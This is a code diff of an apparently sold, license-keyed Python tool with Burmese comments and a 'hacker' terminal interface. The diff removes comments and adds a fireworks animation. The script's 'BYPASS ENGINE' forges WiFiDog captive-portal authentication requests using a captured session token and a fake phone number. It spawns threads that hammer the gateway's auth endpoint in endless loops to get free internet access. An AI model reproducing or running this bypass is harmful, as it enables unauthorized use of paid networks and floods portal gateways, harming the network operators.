@@ -54,19 +54,16 @@ BANNER = """
 # UNIQUE HWID GENERATOR (SECURE)
 # ===============================
 def get_hwid():
-    """ဖုန်းတစ်လုံးချင်းစီအတွက် လုံးဝမတူညီသော ID ထုတ်ပေးပြီး ဖုန်းထဲမှာ သိမ်းထားခြင်း"""
+    """ဖုန်းတစ်လုံးချင်းစီအတွက် လုံးဝမတူညီသော ID ထုတ်ပေးခြင်း"""
     id_file = os.path.expanduser("~/.moe_yu_id")
     try:
-        # အကယ်၍ ဖုန်းထဲမှာ ID ဖိုင်ရှိပြီးသားဆိုရင် အဲဒါကိုပဲ သုံးမယ်
         if os.path.exists(id_file):
             with open(id_file, "r") as f:
                 return f.read().strip()
         
-        # ဖိုင်မရှိသေးရင် ID အသစ် ဖန်တီးမယ် (UUID သုံးထားလို့ လုံးဝမတူနိုင်ပါ)
         raw_id = str(uuid.uuid4()).split('-')[0].upper()
         new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
         
-        # ဖန်တီးထားတဲ့ ID ကို ဖုန်းထဲမှာ ဝှက်ပြီးသိမ်းထားမယ်
         with open(id_file, "w") as f:
             f.write(new_id)
         return new_id
@@ -74,7 +71,6 @@ def get_hwid():
         return "MOE-DEFAULT-999"
 
 def check_expiry(expiry_str):
-    """သက်တမ်းကုန်မကုန် စစ်ဆေးခြင်း"""
     if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]:
         return True, "Lifetime"
     try:
@@ -87,7 +83,7 @@ def check_expiry(expiry_str):
         return True, "Lifetime"
 
 # ===============================
-# UI FUNCTIONS
+# UI FUNCTIONS (ပြန်ထည့်ပေးထားသည်)
 # ===============================
 def display_hacker_flag():
     w = 40 
@@ -108,6 +104,15 @@ def simpler_hacker_typing(text, style="bold green"):
         time.sleep(0.02)
     console.print()
 
+def success_fireworks():
+    """အောင်မြင်တဲ့အခါ ပြမယ့် ကြယ်လေးတွေနဲ့ မီးပန်းလေးများ"""
+    colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
+    for _ in range(2):
+        for _ in range(12):
+            fire = " " * random.randint(1, 45) + random.choice(["✨", "💥", "🔥", "⚡", "🌟", "⭐"])
+            console.print(Text(fire, style=random.choice(colors)))
+            time.sleep(0.02)
+
 def hacking_status(message, duration=0.8):
     with console.status(f"[bold green]{message}[/bold green]", spinner="dots12", spinner_style="bold green"):
         time.sleep(duration + random.uniform(0.1, 0.4))
@@ -120,7 +125,6 @@ def check_license_hacker_style():
     console.clear()
     display_hacker_flag()
     
-    # ID ပြသခြင်း
     console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", 
                                      title="[bold red]DEVICE INFO[/bold red]", 
                                      border_style="bold cyan", expand=False)))
@@ -142,7 +146,6 @@ def check_license_hacker_style():
         hacking_status("Verifying HWID & Expiry...")
         
         for entry in lines:
-            # Format: Key|Expiry|HWID
             parts = entry.split("|")
             db_key = parts[0].strip()
             exp_date = parts[1].strip() if len(parts) > 1 else "None"
@@ -150,16 +153,15 @@ def check_license_hacker_style():
 
             if user_key == db_key:
                 found = True
-                # HWID စစ်ဆေးခြင်း
                 if db_hwid != "FREE" and db_hwid != my_hwid:
                     simpler_hacker_typing("ACCESS_DENIED: HWID_MISMATCH", style="bold red")
                     console.print(f"\n[bold red]❌ ဒီ Key က တခြားဖုန်းမှာ သုံးထားပြီးသားဖြစ်နေပါတယ်![/bold red]")
                     console.print(f"[bold yellow]⚠️ သင့် HWID ({my_hwid}) ကို Admin ဆီပို့ပြီး အတည်ပြုခိုင်းပါ။[/bold yellow]")
                     sys.exit()
                 
-                # Expiry စစ်ဆေးခြင်း
                 is_active, date_label = check_expiry(exp_date)
                 if is_active:
+                    success_fireworks() # ကြယ်လေးတွေ ဒီမှာ ပေါ်ပါမယ်
                     simpler_hacker_typing(f"ACCESS_GRANTED: AUTHENTICATION SUCCESS")
                     console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                     return True
@@ -178,10 +180,8 @@ def check_license_hacker_style():
 # BYPASS ENGINE
 # ===============================
 def check_real_internet():
-    try: 
-        return requests.get("http://www.google.com", timeout=3).status_code == 200
-    except: 
-        return False
+    try: return requests.get("http://www.google.com", timeout=3).status_code == 200
+    except: return False
 
 def start_bypass_process():
     logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
@@ -216,15 +216,11 @@ def start_bypass_process():
             gw_port = params.get('gw_port', ['2060'])[0]
             auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
             
-            logging.info(f"{GREEN}Session ID Captured: {sid}{RESET}")
-            # Speed Bypass Threads
             for _ in range(PING_THREADS):
                 threading.Thread(target=lambda: [session.get(auth_link) for _ in iter(int, 1)], daemon=True).start()
             
-            while check_real_internet(): 
-                time.sleep(5)
-        except: 
-            time.sleep(5)
+            while check_real_internet(): time.sleep(5)
+        except: time.sleep(5)
 
 # ===============================
 # MAIN RUNNER
